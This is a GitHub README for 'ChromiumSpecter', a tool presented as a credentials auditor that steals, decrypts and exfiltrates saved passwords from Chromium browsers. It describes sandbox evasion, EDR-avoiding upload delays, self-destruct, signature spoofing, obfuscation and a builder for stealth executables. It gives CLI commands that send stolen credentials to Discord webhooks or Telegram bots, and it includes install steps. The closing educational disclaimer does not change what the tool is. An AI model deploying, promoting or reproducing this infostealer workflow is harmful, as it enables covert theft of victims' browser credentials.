<div align="center">
  <img src="app.ico" width="128" height="128" alt="ChromiumSpecter Logo">
  <h1>ChromiumSpecter</h1>
  <p><strong>Professional Credentials Auditor for Chromium Browsers</strong></p>

*The definitive tactical-grade suite for security audits on Chromium-based browsers.*

[Report Bug](https://github.com/ANONIMO432HZ/ChromiumSpecter/issues) | [Request Feature](https://github.com/ANONIMO432HZ/ChromiumSpecter/issues)

</div>

---

<div align="center">
  <img src="screenshots/dashboard.png" width="800" alt="ChromiumSpecter Dashboard">
</div>

---

## 📖 Overview

**ChromiumSpecter** is a high-performance auditing tool designed for security professionals and pentesting teams. It allows for the recovery, decryption, and exfiltration of credentials stored in Chromium-based browsers (Chrome, Edge, Brave, Opera, Vivaldi) using advanced stealth and anti-forensics techniques.

### 🌟 Key Features

* **🖥️ High-Density Dashboard**: Professional GUI with real-time consoles, dynamic statistics, and optimized result management.
* **🕵️ Tactical Stealth Engine**:
  * **Startup Delay**: Initial delay selector (0-300s) to evade analysis in smart Sandboxes.
  * **Inter-file Delay (`send_delay`)**: Customizable pauses between uploads to prevent traffic spikes that alert firewalls or EDRs.
  * **Anti-Forensics**: **Tactical Self-Destruct** (Auto-Delete) support for the binary after execution.
  * **Panic Protocol**: Total sanitization of the audit environment with a single click.

<div align="center">
  <img src="screenshots/exit_self-destroy.png" width="600" alt="ChromiumSpecter Panic Exit">
</div>
* **🚀 Smart Exfiltration**:
  * **Auto-Exfiltrate**: Immediate automatic upload configuration after audit.
  * **Multi-Channel**: Native support for **Telegram Bots** and **Discord Webhooks** with redundancy.
  * **Local Persistence**: Secure saving of exfiltration settings for recurring use.

<div align="center">
  <img src="screenshots/mantemiento.png" width="800" alt="ChromiumSpecter Maintenance">
</div>

**🛠️ Integrated Visual Builder**:

* Generation of custom stubs with **Dynamic Injection** of parameters.
* **Metadata Spoofing**: Integrated presets to clone signatures.
* **Compression and Obfuscation**: Native support for UPX and PyArmor.

<div align="center">
  <img src="screenshots/builder.png" width="800" alt="ChromiumSpecter Builder">
</div>

---

## 🚀 Tactical Workflow

1. **Configuration**: Define your Telegram/Discord tokens in the **Exfiltration** Tab and save them.
2. **Audit**: Launch the scan from the Dashboard. You can enable **Auto-exfiltrate** and **Self-Destruct** for a "fire and forget" cycle.
3. **Inspection**: View decrypted credentials in real-time in the **Results** Tab.
4. **Deployment**: Use the **Builder** to generate an `.exe` with your embedded credentials (Base64) and configured stealth presets.

## 🖥️ Advanced Usage (CLI)

The core engine (`main.py`) can run independently without the GUI, ideal for automation or quick terminal deployments.

```bash
# Basic audit
python main.py

# Audit with automatic exfiltration to Discord and self-destruct
python main.py --webhook "https://discord.com/api/webhooks/..." --self-destruct

# Silent audit (no console) saving to custom folder
python main.py --stealth --output-dir "C:\temp\logs"
```

### Available Parameters (CLI)

| Group | Parameter | Description |
| :--- | :--- | :--- |
| **Exfiltration** | `--webhook` | Discord Webhook URL for report uploads. |
| | `--tg-token` | Telegram bot token. |
| | `--tg-chat-id` | Telegram chat or channel ID. |
| | `--no-exfil` | Disables external data upload. |
| **Reports** | `--no-html` | Does not generate the visual HTML report. |
| | `--no-csv` | Does not generate the structured CSV report. |
| | `--json` | Generates an additional report in JSON format. |
| | `--output-dir` | Output folder (default: `.audit`). |
| **Engine** | `--browser` | Filter by specific browser (chrome, brave, etc). |
| | `--delay` | Initial delay (seconds) before action. |
| | `--stealth` | Hides the console window immediately on startup. |
| | `--auto-kill` | Automatically closes browsers if database is locked. |
| | `--self-destruct` | 💥 **Deletes the executable** after the cycle. |
| | `--no-wipe` | Does not delete local reports after upload. |
| | `--clean` | Cleans all old reports in the output folder. |
| | `--debug` | Shows detailed debug logs. |

---

## ⚙️ Compilation Parameters (Stub)

| Parameter | Range/Type | Description |
| :--- | :--- | :--- |
| **Initial Delay** | 0s - 300s | Delay before first action (Anti-Sandbox). |
| **Send Delay** | 0s - 10s | Pause between uploaded files (Traffic evasion). |
| **Webhook Timeout** | 5s - 60s | Wait time for unstable connections. |
| **Auto-Exfiltrate** | Checkbox | Enables automatic upload without intervention. |
| **UAC Prompt** | Toggle | Requests administrator privileges if needed. |

---

## 📡 Exfiltration Setup

### 🤖 Telegram

Requires **Token** and **Chat ID**.

* Get the token with `@BotFather`.
* Get your ID with `@userinfobot`.

### 🎮 Discord

Requires **Webhook URL**.

* Set it up in: Channel Settings -> Integrations -> Webhooks.

---

## ⚙️ Installation Guide

```bash
# 1. Clone the repository
git clone https://github.com/ANONIMO432HZ/ChromiumSpecter
cd ChromiumSpecter

# 2. Install dependencies
pip install -r requirements.txt

# 3. Launch the Dashboard
python gui_app.py
```

---

## ⚠️ Disclaimer

This tool was developed for **educational and professional auditing purposes** only. The use of this software for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
